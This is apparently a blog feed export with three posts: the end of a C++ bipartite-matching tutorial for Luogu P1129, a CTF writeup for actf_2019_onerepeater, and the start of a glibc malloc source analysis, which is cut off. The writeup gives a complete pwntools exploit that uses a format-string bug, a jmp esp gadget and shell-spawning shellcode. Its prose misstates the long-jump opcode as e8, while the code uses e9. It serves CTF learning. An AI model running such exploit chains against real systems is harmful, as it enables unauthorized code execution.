class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[MAX_EDGE];</span><br><span class="line"><span class="keyword">int</span> match[MAX_NODE],check[MAX_NODE],root[MAX_NODE];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;s;<span class="comment">//存储一边的点集</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">            check[v]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">                match[u]=v;</span><br><span class="line">                match[v]=u;</span><br><span class="line">                check[v]=<span class="literal">false</span>; </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(match[s[i]]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[s[i]]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">dfs</span>(s[i]))ans++;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="https://www.luogu.com.cn/problem/P1129">洛谷P1129</a></p><p>小 Q 是一个非常聪明的孩子，除了国际象棋，他还很喜欢玩一个电脑益智游戏――矩阵游戏。矩阵游戏在一个 n \times n<em>n</em>×<em>n</em> 黑白方阵进行（如同国际象棋一般，只是颜色是随意的）。每次可以对该矩阵进行两种操作：</p><ul><li>行交换操作：选择矩阵的任意两行，交换这两行（即交换对应格子的颜色）。</li><li>列交换操作：选择矩阵的任意两列，交换这两列（即交换对应格子的颜色）。</li></ul><p>游戏的目标，即通过若干次操作，使得方阵的主对角线(左上角到右下角的连线)上的格子均为黑色。</p><p>对于某些关卡，小 Q 百思不得其解，以致他开始怀疑这些关卡是不是根本就是无解的！于是小 Q 决定写一个程序来判断这些关卡是否有解。</p><p>题意简单明了就是给一个01矩阵，问你能不能通过行交换与列交换将主对角线的元素都变成1。</p><p>那么其实就是每一行找到一个1，使得每个1处于不同的列。只要找到，那么经过若干次交换一定能使主对角线元素都为1。如果第一行的第三列存在一个1，那么就让1和3相连。当然因为这里的3不能和第三行混淆，所以我们选择列数+n作为二分图的另一个点集。所以我们只需要让行列都匹配那就完成了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[<span class="number">100000</span>];</span><br><span class="line"><span class="keyword">int</span> cnt,n,root[<span class="number">501</span>],check[<span class="number">500</span>],match[<span class="number">500</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;%d %d\n&quot;,x,y);</span></span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    edge[cnt].next=root[x];</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">            check[v]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">                match[u]=v;</span><br><span class="line">                match[v]=u;</span><br><span class="line">                check[v]=<span class="literal">false</span>; </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(match[i]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[i]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">dfs</span>(i))ans++;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">memset</span>(root,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(root));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n;i++)match[i]=<span class="number">-1</span>;</span><br><span class="line">    cnt=<span class="number">0</span>;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> x;</span><br><span class="line">            cin&gt;&gt;x;</span><br><span class="line">            <span class="keyword">if</span>(x==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">add</span>(i,j+n);</span><br><span class="line">                <span class="built_in">add</span>(j+n,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">xyl</span>()==n)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里被卡了有点久，最后发现是数组越界，在使用前向星存无向图的时候一定要记得开两倍内存，不然写越界了很难说错误在哪。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/7.png" alt="7"></p><p>血淋淋的教训，并且失败的俩测试点没有报错re，而是wrong answer。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 二分图 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>actf_2019_onerepeater writeup</title>
      <link href="/2022/02/02/actf_2019_onerepeater%20writeup/"/>
      <url>/2022/02/02/actf_2019_onerepeater%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录，<a href="https://buuoj.cn/challenges#actf_2019_onerepeater">actf_2019_onerepeater</a></p><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到elf文件<code>checksec</code>一波，无任何保护，栈可执行，那么多半是要把程序流劫持到栈上执行<code>shellcode</code>了，拖进ida里面。</p><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/1.png" alt="1"></p><p>逻辑比较简单，菜单题，然后选项2是明显的格式化字符串漏洞，1选项就是读入<code>0x400</code>字节的数据。首先找到<code>jmp esp</code>的<code>gadget</code>。</p><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/2.png" alt="2"></p><p>有就很好办了，利用格式化字符串改掉返回地址为这个gadget，然后再在后面写一个跳板指令跳到缓冲区内，只要在退出之前把缓冲区写上shellcode就可以很快<code>get shell</code>了。</p><p>先通过测试偏移，发现buf在格式化字符串函数的第16个参数。</p><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/3.png" alt="3"></p><p>那么我们先把返回地址劫持了再说，经过调试发现返回地址在buf+0x41c的位置上。</p><p>写出部分exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="部分汇编知识"><a href="#部分汇编知识" class="headerlink" title="部分汇编知识"></a>部分汇编知识</h2><p>这里需要讲一讲汇编的知识了，因为我们在<code>jmp esp</code>的时候<code>esp</code>是指向我们返回地址的后面一格，所以<code>eip</code>等会会指向<code>ret_addr+4</code>的位置上，那么这个位置我们写些什么呢，当然直接写<code>shellcode</code>是肯定没问题的，实际操作也不会太难，一个循环解决，但是当复杂起来的时候这个就有点难，所以再需要一个跳板指令执行<code>jmp buf</code>，这里我们讲讲<code>jmp</code>的实现，<code>jmp</code>的编码是<code>5</code>个字节，其实有分大跳小跳，小跳只要两个字节，但是只能跳前后<code>0x7f</code>以内的位置。这里要跳到<code>buf</code>显然要用大跳了，大跳的编码是<code>e8</code> 后面跟上小端的<code>int</code>字节序。这个<code>int</code>字节呢代表偏移。</p><p>平时我们看到的<code>jmp 0x400689</code>这些实际编码都不是这样子编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 89 06 40 00</span><br></pre></td></tr></table></figure><p>而是会根据这个指令所处的位置，然后计算下一条指令到我要跳转的指令位置的数值作为jmp的参数。</p><p>举个例子，假如这个jmp 0x400689所处的位置是0x400500。那么它的编码将是</p><p>0x400689-(0x400500+5)=0x134</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 34 01 00 00</span><br></pre></td></tr></table></figure><p>这样子得到的。</p><p>如果是往低地址跳那就用负数表示。</p><p>这里呢我们要往<code>buf</code>跳，也就是低地址跳转，那么我们指令的位置是<code>buf+0x420</code>，所以得到偏移<code>0x425</code>，因为指令长度占了五个，跳转的起始位置是执行完这个指令的下一个位置。</p><p>取负数得到<code>0xfffffbdb</code>。</p><p>我们就得到了跳板指令的编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 db fb ff ff</span><br></pre></td></tr></table></figure><p>同样在下方部署这些字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那么最后指令就会跳转到<code>buf</code>上，在选择3之前在<code>buf</code>上填一遍<code>shellcode</code>就完事了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="/2022/02/02/actf_2019_onerepeater%20writeup/4.png" alt="4"></p><p>可以看到通过两次跳转，程序成功执行到了<code>shellcode</code>，然后就愉快的<code>cat flag</code> 吧</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./ACTF_2019_OneRepeater&#x27;</span>,port=<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Exit&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>malloc源码分析</title>
      <link href="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>学了这么久堆漏洞了，我想应该把<code>glibc</code>的<code>malloc</code>和<code>free</code>源码解析写一下了，希望能帮助一下刚上路的师傅，同时也巩固一下自身知识。</p><span id="more"></span><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>我们平时写程序的时候，某些变量可能需要在开始就分配内存，这些内存是不可避免的。那么这些内存就是静态分配的，当程序编译完成之后，它就确定了占用这么多的内存。但是有时候，实际问题的规模没有预期那么大，我们不一定需要很大的内存，如果每次都按最大考虑那么就有很大一部分内存是被浪费的，这就是静态分配内存的弊端，虽然咱打acm的时候都是静态分配的，但是这没啥，因为每个问题不要超过它的总内存上限问题就不大(狗头。但是在内存不足的年代，如果都这样使用静态分配内存的方式，那么计算机的效率会被拖垮很多，所以就有动态分配内存的概念了。</p><p><code>glibc</code>采用<code>ptmalloc</code>的管理方式去分配内存。</p><h2 id="ptmalloc2的分配策略"><a href="#ptmalloc2的分配策略" class="headerlink" title="ptmalloc2的分配策略"></a>ptmalloc2的分配策略</h2><p>那么动态分配内存要怎么去分配呢？如果我们需要占用除了我程序本身占用的内存以外的一块内存，那程序指定是没权限用的，得先向操作系统申请这一块内存的使用权。而操作系统没那么闲，分配几个字节的内存都要它去管，操作系统管理都是按页式的管理。而一页的内存是<code>0x1000B</code>，如果每一次申请我都向操作系统申请，每一次归还都直接归还给操作系统那么必定会增大操作系统的负担。因此分配内存的时候可以按照一个策略去分配，分配一定得尽量避免过多地使用系统调用，归还的时候可以等到程序结束时一并归还，这样的话操作系统的负担就大大下降了。</p><p><code>ptmalloc2</code>的分配方式会在你第一次<code>malloc</code>的时候向操作系统申请<code>0x21000B(132KB)</code>的内存，然后后续分配就不会向操作系统申请内存，只有用完了的时候才会再次申请内存。</p><p>操作系统的问题解决了之后我们再来看看<code>glibc</code>怎么处理具体的分配细节。分配的时候我一定是切出一块特定大小才是最优的策略的，比如程序<code>malloc(4)</code>，那我接切个4字节的内存给它用，<code>malloc(1)</code>那就给它一字节去使用。然而现实没有那么理想，因为如果我切下来的块用户程序完全可写的话，那么我怎么区分这个内存块是否被使用呢？然后内存块的分界线又如何界定呢？所以分割内存块的时候不可避免地要在内存块中额外开出一部分区域用于管理。那么可以在每个分配的内存块加上一个<code>int</code>数据作为此内存块的<code>size</code>，64位的操作系统可以使用<code>long long</code>。同理，为了管理方便，<code>glibc</code>在分配<code>chunk</code>的时候也并不是分配这么多就只能写这么多的。它也不想闲到去管1字节2字节这样的内存块。而且如果有这样的内存块，那么在分配指针的时候内存没办法对齐会出现很多麻烦的事。所以在分配内存块的时候，有一个<code>SIZE_SZ</code>，一次分配的内存必定是<code>SIZE_SZ*2</code>的整倍数，<code>SIZE_SZ</code>在32位操作系统下的值是<code>4</code>，64位的值是<code>8</code>。为了方便，以下把内存块统一叫<code>chunk</code>。</p><p>以32位操作系统为例，size的值必定为8的整数倍，二进制角度下看来，低三位永远是0，这样有点浪费了内存，因此规定<code>size</code>的低三位不作为实际的<code>chunk</code>大小，而是标志位。三个标志位从高位到低位分别是：</p><ol><li><code>NON_MAIN_ARENA</code>:是否为主分配，0表示是主分配，权值为4</li><li><code>IS_MMAPPED</code>:表示内存是否为<code>mmap</code>获得，0表示不是，权值为2</li><li><code>PREV_INUSE</code>:表示前面一个内存块是否被使用，0表示不被使用，权值为1</li></ol><p>在64位操作系统中，多出一个标志位，但是这个标志位无任何意义，可能后续会赋予别的意义，但是它一样不影响<code>chunk</code>的大小。</p><p>在看malloc源码的时候可以看到一个宏定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span 